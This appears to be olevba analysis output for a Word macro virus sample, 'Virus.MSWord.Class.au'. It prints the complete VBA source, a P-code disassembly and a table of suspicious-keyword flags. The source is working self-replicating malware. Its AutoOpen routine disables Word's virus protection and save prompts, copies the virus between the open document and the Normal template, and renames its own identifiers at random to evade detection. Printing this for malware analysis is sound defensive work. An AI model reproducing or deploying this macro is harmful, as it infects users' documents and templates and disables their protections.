olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.au
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.au - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
PE8690 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
GL8530 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set RQ4058 = ActiveDocument.VBProject.VBComponents.Item(1)
EM333 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set RQ4058 = NormalTemplate.VBProject.VBComponents.Item(1)
DV094 = True
Call QE896_JI08
End If
If DV094 <> True And EM333 <> True Then GoTo SA2266
If DV094 = True Then RQ4058.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PE8690 - 1))
If EM333 = True Then RQ4058.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, GL8530 - 1))
SA2266:
If GL8530 <> 0 And PE8690 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Sub QE896_JI08()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "EN642": r1(2) = "FK2681": r1(3) = "FP2810": r1(4) = "LM8433": r1(5) = "JI08": r1(6) = "PE8690"
r1(7) = "GL8530": r1(8) = "EM333":: r1(9) = "RQ4058": r1(10) = "DV094": r1(11) = "SA2266": r1(12) = "QE896": r1(13) = "LD4177": r1(14) = "SD8150"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call JI08(a1, r1(x))
Next x
End Sub
Private Sub JI08(SD8150, LD4177 As String)  'v1.0
On Error Resume Next
Dim EN642 As Long: Dim FK2681 As Long: Dim FP2810 As Long: Dim LM8433 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
EN642 = 1: FK2681 = 1: FP2810 = .CountOfLines: LM8433 = Len(.Lines(.CountOfLines, 1))
Do While .Find(LD4177, EN642, FK2681, FP2810, LM8433, True)
strline = .Lines(EN642, 1)
strline = Left(strline, FK2681 - 1) & SD8150 & Mid(strline, LM8433)
.replaceline EN642, strline
EN642 = FP2810 + 1: FK2681 = 1:
FP2810 = .CountOfLines
LM8433 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.au
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14480 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St PE8690 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St GL8530 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set RQ4058 
' Line #9:
' 	LitVarSpecial (True)
' 	St EM333 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set RQ4058 
' Line #13:
' 	LitVarSpecial (True)
' 	St DV094 
' Line #14:
' 	ArgsCall (Call) QE896_JI08 0x0000 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld DV094 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld EM333 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo SA2266 
' 	EndIf 
' Line #17:
' 	Ld DV094 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld PE8690 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld RQ4058 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #18:
' 	Ld EM333 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld GL8530 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld RQ4058 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #19:
' 	Label SA2266 
' Line #20:
' 	Ld GL8530 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld PE8690 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Private Sub QE896_JI08())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall Read 0x0000 
' Line #25:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn r1 (As String)
' Line #26:
' 	LitStr 0x0005 "EN642"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "FK2681"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "FP2810"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "LM8433"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "JI08"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "PE8690"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #27:
' 	LitStr 0x0006 "GL8530"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "EM333"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0006 "RQ4058"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "DV094"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "SA2266"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "QE896"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "LD4177"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "SD8150"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' Line #28:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #29:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #30:
' 	Ld a1 
' 	Ld x 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) JI08 0x0002 
' Line #31:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Private Sub JI08(SD8150, LD4177 As String))
' 	QuoteRem 0x002C 0x0004 "v1.0"
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	Dim 
' 	VarDefn EN642 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn FK2681 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn FP2810 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn LM8433 (As Long)
' Line #36:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #37:
' 	LitDI2 0x0001 
' 	St EN642 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St FK2681 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St FP2810 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St LM8433 
' Line #38:
' 	Ld LD4177 
' 	Ld EN642 
' 	Ld FK2681 
' 	Ld FP2810 
' 	Ld LM8433 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #39:
' 	Ld EN642 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #40:
' 	Ld strline 
' 	Ld FK2681 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld SD8150 
' 	Concat 
' 	Ld strline 
' 	Ld LM8433 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #41:
' 	Ld EN642 
' 	Ld strline 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #42:
' 	Ld FP2810 
' 	LitDI2 0x0001 
' 	Add 
' 	St EN642 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St FK2681 
' 	BoS 0x0000 
' Line #43:
' 	MemLdWith CountOfLines 
' 	St FP2810 
' Line #44:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St LM8433 
' Line #45:
' 	Loop 
' Line #46:
' 	EndWith 
' Line #47:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

